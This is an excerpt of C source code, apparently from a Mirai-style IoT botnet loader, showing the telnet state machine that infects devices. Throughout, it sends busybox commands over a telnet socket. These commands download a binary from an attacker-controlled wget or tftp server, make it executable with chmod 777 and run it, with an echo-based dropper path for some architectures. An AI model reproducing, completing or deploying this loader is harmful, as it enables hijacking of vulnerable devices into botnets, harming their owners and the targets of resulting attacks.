        ...
        while(TRUE)
        {
                ...
                switch(conn->state_telnet)
                {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "tmp", conn->info.arch);
                                    #ifdef DEBUG
                                        printf("wget\n");
                                    #endif
                                    break;
				                case UPLOAD_TFTP:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "tmp", conn->info.arch, wrker->srv->tftp_host_ip);
				    				#ifdef DEBUG
                                    	printf("tftp\n");
			 	    				#endif
                                    break;
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s telnet.echo; " EXEC_QUERY "\r\n", FN_DROPPER);
                            else
                                util_sockprintf(conn->fd, "./%s; ./%s telnet.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.wget; " EXEC_QUERY "\r\n");
		    ...
		    case TELNET_UPLOAD_TFTP:
                        ...
                        if(consumed > 0)
                        {
			    			...
			    			#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.tftp; " EXEC_QUERY "\r\n");
